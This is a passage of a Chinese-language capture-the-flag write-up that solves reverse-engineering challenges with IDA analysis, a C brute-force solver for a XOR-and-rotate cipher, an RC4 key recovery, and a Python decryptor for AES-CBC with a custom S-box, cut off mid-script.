class="line">		a[i]+=++b%<span class="number">0x100</span>+i*i;</span><br><span class="line">		flag[i]=(a[i]&gt;&gt;<span class="number">5</span>)|(a[i]&lt;&lt;<span class="number">3</span>);</span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		b++;</span><br><span class="line">		b^=<span class="number">0x1A373</span>;</span><br><span class="line">		b++;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02X\n&quot;</span>,flag[i]%<span class="number">0x100</span>);</span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,b);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>模拟出了函数的主要加密流程</p><p>直接编写爆破脚本</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> enc[] = &#123;</span><br><span class="line">	<span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0x69</span>, <span class="number">0x3D</span>, <span class="number">0x5F</span>, <span class="number">0x01</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>,</span><br><span class="line">	<span class="number">0xA4</span>, <span class="number">0x6D</span>, <span class="number">0x89</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xEA</span>, <span class="number">0xD1</span>, <span class="number">0x9C</span>,</span><br><span class="line">	<span class="number">0x71</span>, <span class="number">0x6D</span>, <span class="number">0xE1</span>, <span class="number">0x1E</span>, <span class="number">0x38</span>, <span class="number">0x7E</span>, <span class="number">0x8C</span>, <span class="number">0x0A</span>,</span><br><span class="line">	<span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xE0</span>, <span class="number">0xF7</span>, <span class="number">0x36</span>, <span class="number">0x72</span>, <span class="number">0x99</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="keyword">sizeof</span>(enc) / <span class="keyword">sizeof</span>(enc[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">encrypt_byte</span><span class="params">(<span class="type">uint8_t</span> ch, <span class="type">uint32_t</span> *pb, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> b = *pb;</span><br><span class="line">	<span class="type">uint8_t</span> x = ch;</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	x = (<span class="type">uint8_t</span>)(((++b) &amp; <span class="number">0xFF</span>) ^ x ^ <span class="number">0xAA</span>);</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	x = (<span class="type">uint8_t</span>)(x + (((++b) &amp; <span class="number">0xFF</span>) + i * i));</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	b++;</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	x = (<span class="type">uint8_t</span>)(x + (((++b) &amp; <span class="number">0xFF</span>) + i * i));</span><br><span class="line">	<span class="type">uint8_t</span> out = (<span class="type">uint8_t</span>)(((x &gt;&gt; <span class="number">5</span>) | (x &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span>);</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	b++;</span><br><span class="line">	b ^= <span class="number">0x1A373</span>;</span><br><span class="line">	b++;</span><br><span class="line">	</span><br><span class="line">	*pb = b;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint8_t</span> flag[N + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">uint32_t</span> b = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> b_start = b;</span><br><span class="line">		<span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> ch = <span class="number">0</span>; ch &lt; <span class="number">128</span>; ch++) &#123;</span><br><span class="line">			<span class="type">uint32_t</span> bt = b_start;</span><br><span class="line">			<span class="type">uint8_t</span> out = encrypt_byte((<span class="type">uint8_t</span>)ch, &amp;bt, i);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (out == enc[i]) &#123;</span><br><span class="line">				flag[i] = (<span class="type">uint8_t</span>)ch;</span><br><span class="line">				b = bt;</span><br><span class="line">				found = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!found) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n[!] position %d no candidate found\n&quot;</span>, i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	flag[N] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="re-QYQSの奇妙冒险"><a href="#re-QYQSの奇妙冒险" class="headerlink" title="re-QYQSの奇妙冒险"></a>re-QYQSの奇妙冒险</h3><p>在ida中找到main函数</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109163158223.png"></p><p>发现主要加密都是通过异或来实现的</p><p>所以我们只需要把我们输入的内容patch成密文，经过异或就能还原出结果</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109163725012.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109163537283.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109163555383.png"></p><h3 id="re-Gensh1n"><a href="#re-Gensh1n" class="headerlink" title="re-Gensh1n"></a>re-Gensh1n</h3><p>在ida中找到main函数</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109163854817.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164230398.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164241411.png"></p><p>通过分析发现一开始就是让我们输入geek2025</p><p>但flag并不是这个</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164340837.png"></p><p>在我们输入正确的内容之后发现程序并没有结束，貌似好像还要再输入一些数据才会退出，所以推测main函数不是最主要的加密函数，真正的加密函数应该还在程序某处，而且第二次输入的数据应该才是真正的flag，而main函数最后就多出了<img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164705616.png"></p><p>这个函数的作用不知道是什么</p><p>所以尝试交叉引用一下</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164729153.png"></p><p>发现还有另一个函数也引用了它，所以跟进去看看</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164757513.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109164846324.png"></p><p>发现是rc4加密，密钥就是我们一开始输入的geek2025</p><p>密文在result中</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165021481.png"></p><p>所以用cyberchef直接解</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165143422.png"></p><h3 id="re-Mission-Ghost-Signal"><a href="#re-Mission-Ghost-Signal" class="headerlink" title="re-Mission Ghost Signal"></a>re-Mission Ghost Signal</h3><p><img lazyload src="/images/loading.svg" data-src="C:\Users\19124\AppData\Roaming\Typora\typora-user-images\image-20251109165352423.png"></p><p>解压出来两个程序，压缩包解压需要密码，encode.exe是一个密码验证程序，这个密码应该就是压缩包解压的密码</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165541172.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165555130.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165603968.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165620792.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165627078.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165633949.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165644709.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165651985.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165658703.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165704820.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251109165716150.png"></p><p>这里很明显就是一个AES-128-CBC 加密校验，1145141145144332是IV，Syclover2025Geek是KEY，但用的是自定义的sbox</p><p>解密脚本如下</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Decrypt the 32-byte ciphertext from the challenge using the exact block</span></span><br><span class="line"><span class="string">cipher described by the reversed code:</span></span><br><span class="line"><span class="string">- AES-like structure (Nr=10, 128-bit key), CBC mode</span></span><br><span class="line"><span class="string">- Custom S-box: S[x] = 0xA7 ^ (x&#x27; ^ ROL1(x&#x27;) ^ ROL2(x&#x27;) ^ ROL3(x&#x27;) ^ ROL4(x&#x27;)),</span></span><br><span class="line"><span class="string">  where x&#x27; = x^(253) in GF(2^8) with modulus 0x11B, and x=0 -&gt; x&#x27;=0</span></span><br><span class="line"><span class="string">- Key schedule uses the same S-box (SubWord/RotWord/Rcon)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- GF(2^8) arithmetic (AES polynomial 0x11B) ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl8</span>(<span class="params">x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">8</span> - n))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ (<span class="number">0x1B</span> <span class="keyword">if</span> (x &amp; <span class="number">0x80</span>) <span class="keyword">else</span> <span class="number">0</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf_mul</span>(<span class="params">a: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    x = a &amp; <span class="number">0xFF</span></span><br><span class="line">    y = b &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            res ^= x</span><br><span class="line">        x = xtime(x)</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf_pow_253</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Match sub_4014F6(): for a!=0 returns a^253; for a==0 returns 0.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    v = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">253</span>):   <span class="comment"># 0..252 inclusive</span></span><br><span class="line">        v = gf_mul(v, a)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- S-box (and inverse) from the binary ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_sboxes</span>(<span class="params">constant: <span class="built_in">int</span> = <span class="number">0xA7</span></span>):</span><br><span class="line">    S = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    Si = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        inv = gf_pow_253(i)  <span class="comment"># <span class="doctag">NOTE:</span> 253, not 254</span></span><br><span class="line">        L = inv ^ rotl8(inv,<span class="number">1</span>) ^ rotl8(inv,<span class="number">2</span>) ^ rotl8(inv,<span class="number">3</span>) ^ rotl8(inv,<span class="number">4</span>)</span><br><span class="line">        s = constant ^ L</span><br><span class="line">        S[i] = s</span><br><span class="line">        Si[s] = i</span><br><span class="line">    <span class="keyword">return</span> S, Si</span><br><span class="line"></span><br><span class="line">SBOX, INV_SBOX = build_sboxes(<span class="number">0xA7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- Key schedule (matches sub_4019B7) ----------</span></span><br><span class="line">RCON = [<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]  <span class="comment"># 0..10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_word</span>(<span class="params">word: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [SBOX[b] <span class="keyword">for</span> b <span class="keyword">in</span> word]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot_word</span>(<span class="params">word: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [word[<span class="number">1</span>], word[<span class="number">2</span>], word[<span class="number">3</span>], word[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_key</span>(<span class="params">key: <span class="built_in">bytes</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span></span><br><span class="line">    <span class="comment"># W: 44 words, each word is 4 bytes</span></span><br><span class="line">    W = [[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        W[i] = [key[<span class="number">4</span>*i + <span class="number">0</span>], key[<span class="number">4</span>*i + <span class="number">1</span>], key[<span class="number">4</span>*i + <span class="number">2</span>], key[<span class="number">4</span>*i + <span class="number">3</span>]]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">44</span>):</span><br><span class="line">        temp = W[j-<span class="number">1</span>][:]</span><br><span class="line">        <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            temp = sub_word(rot_word(temp))</span><br><span class="line">            temp[<span class="number">0</span>] ^= RCON[j//<span class="number">4</span>]</span><br><span class="line">        W[j] = [ (W[j-<span class="number">4</span>][k] ^ temp[k]) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) ]</span><br><span class="line">    <span class="comment"># Round keys rk[0..10], each 16 bytes</span></span><br><span class="line">    rks = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        blk = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            blk.extend(W[<span class="number">4</span>*r + i])</span><br><span class="line">        rks.append(blk)  <span class="comment"># 16 ints</span></span><br><span class="line">    <span class="keyword">return</span> rks</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- Round transforms ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">state: <span class="type">List</span>[<span class="built_in">int</span>], rk: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        state[i] ^= rk[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">s: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># state is column-major: index = row + 4*col</span></span><br><span class="line">    <span class="comment"># rotate right by row index</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        rowbytes = [s[row + <span class="number">4</span>*c] <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># right rotate by &#x27;row&#x27;</span></span><br><span class="line">        rowbytes = rowbytes[-row:] + rowbytes[:-row]</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[row + <span class="number">4</span>*c] = rowbytes[c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_bytes</span>(<span class="params">s: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        s[i] = INV_SBOX[s[i]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">s: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        a0 = s[<span class="number">4</span>*c+<span class="number">0</span>]; a1 = s[<span class="number">4</span>*c+<span class="number">1</span>]; a2 = s[<span class="number">4</span>*c+<span class="number">2</span>]; a3 = s[<span class="number">4</span>*c+<span class="number">3</span>]</span><br><span class="line">        s[<span class="number">4</span>*c+<span class="number">0</span>] = (gf_mul(a0,<span class="number">0x0E</span>) ^ gf_mul(a1,<span class="number">0x0B</span>) ^ gf_mul(a2,<span class="number">0x0D</span>) ^ gf_mul(a3,<span class="number">0x09</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[<span class="number">4</span>*c+<span class="number">1</span>] = (gf_mul(a0,<span class="number">0x09</span>) ^ gf_mul(a1,<span class="number">0x0E</span>) ^ gf_mul(a2,<span class="number">0x0B</span>) ^ gf_mul(a3,<span class="number">0x0D</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[<span class="number">4</span>*c+<span class="number">2</span>] = (gf_mul(a0,<span class="number">0x0D</span>) ^ gf_mul(a1,<span class="number">0x09</span>) ^ gf_mul(a2,<span class="number">0x0E</span>) ^ gf_mul(a3,<span class="number">0x0B</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[<span class="number">4</span>*c+<span class="number">3</span>] = (gf_mul(a0,<span class="number">0x0B</span>) ^ gf_mul(a1,<span class="number">0x0D</span>) ^ gf_mul(a2,<span class="number">0x09</span>) ^ gf_mul(a3,<span class="number">0x0E</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_decrypt</span>(<span class="params">ct_block: <span class="built_in">bytes</span>, round_keys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    s = <span class="built_in">list</span>(ct_block)</span><br><span class="line">    <span class="comment"># Start with last round key</span></span><br><span class="line">    add_round_key(s, round_keys[<span class="number">10</span>])</span><br><span class="line">    inv_shift_rows(s)</span><br><span class="line">    inv_sub_bytes(s)</span><br><span class="line">    <span class="comment"># Rounds 9..1</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        add_round_key(s, round_keys[r])</span><br><span class="line">        inv_mix_columns(s)</span><br><span class="line">        inv_shift_rows(s)</span><br><span class="line">        inv_sub_bytes(s)</span><br><span class="line">    <span class="comment"># Final with rk[0]</span></span><br><span class="line">    add_round_key(s, round_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- CBC &amp; padding ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cbc_decrypt</span>(<span class="params">ct: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(iv) == <span class="number">16</span> <span class="keyword">and</span> <span class="built_in">len</span>(ct) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">    rks = expand_key(key)</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    prev = iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), <span 